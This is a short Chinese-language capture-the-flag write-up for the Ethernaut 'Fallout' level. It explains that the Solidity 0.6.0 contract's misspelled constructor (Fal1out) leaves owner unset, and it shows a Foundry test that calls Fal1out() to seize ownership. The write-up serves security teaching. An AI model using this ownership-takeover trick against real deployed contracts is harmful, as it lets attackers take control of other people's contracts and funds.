# Fallout

## 题目描述

[原题链接](https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639)

获得以下合约的所有权来完成这一关.

## 运行

根据[Foundry 官方文档](https://getfoundry.sh/)配置好运行环境后，于本项目下执行下列命令：

```sh
$ cd WTF-CTF

$ forge test -C src/Ethernaut/Fallout -vvvvv
```

## 功能简述

此合约版本为0.6.0。此时合约的构造函数为合约的同名函数。最新版本0.8.0中，已使用constructor函数代替同名函数作为构造函数。

此合约的构造函数写错了，Fal1out != Fallout 。即合约部署后，并没有初始化owner。

所以只需要调用 Fal1out函数即得到owner权限。

```solidity
Fallout(fallout).Fal1out();
assertEq(Fallout(fallout).owner(), address(this));
```

提交合约实例，完成目标。